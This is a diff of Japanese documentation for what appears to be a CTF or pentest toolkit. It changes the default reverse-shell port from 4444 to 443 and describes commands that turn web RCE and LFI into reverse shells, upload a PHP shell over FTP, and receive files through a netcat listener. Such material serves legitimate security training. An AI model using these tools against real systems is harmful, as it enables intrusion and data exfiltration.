@@ -531,11 +531,11 @@ msfr -m exploit/... -u user --creds --stay
 
 | コマンド | 説明 |
 |----------|------|
-| `listen [port]` | `nc -lvnp`（既定 4444） |
+| `listen [port]` | `nc -lvnp`（既定 443） |
 | `listen -l [port]` | 接続ログを `cases/.../logs/revshell_*` に保存 |
 | `listen -d [port]` | `tar` ストリームを受信して `cases/<room>/exports/listen_<ts>/` に展開（`nc -lvnp PORT | tar xf - -C ...`）。ターゲット側の送信コマンドも表示 |
 | `webrsh [options] [path\|url]` | Web RCE → revshell（`?cmd=` / POST）。LHOST は `tun0` → `eth0` 自動。`-u user[:pass]` で HTTP Basic（pass 省略時は `cl`） |
-| `lfish [options] [path\|url]` | LFI/php://filter include → revshell。PHP filter chain を内部生成し、既定 `LHOST=lhost`、`LPORT=4444`、方式は `proc`（`-t proc|bash|nc` で切替） |
+| `lfish [options] [path\|url]` | LFI/php://filter include → revshell。PHP filter chain を内部生成し、既定 `LHOST=lhost`、`LPORT=443`、方式は `proc`（`-t proc|bash|nc` で切替） |
 
 `ftp-revshell` の前に **別ターミナルで `listen`** を起動する。
 
@@ -558,7 +558,7 @@ msfr -m exploit/... -u user --creds --stay
 | `-U <url>` | shell の完全 URL（パス計算スキップ） |
 | `-n <name>` | リモートファイル名（既定 `shell.php`） |
 | `-p <path>` | ローカルペイロード |
-| `-P <port>` | revshell ポート（既定 4444） |
+| `-P <port>` | revshell ポート（既定 443） |
 
 ### ケース別設定
 
@@ -575,7 +575,7 @@ WEB_PREFIX=/files
 
 ```bash
 cases set startup
-listen 4444          # 別ターミナル
+listen 443           # 別ターミナル
 ftp-revshell
 # または
 ftp-revshell -d ftp -w /files
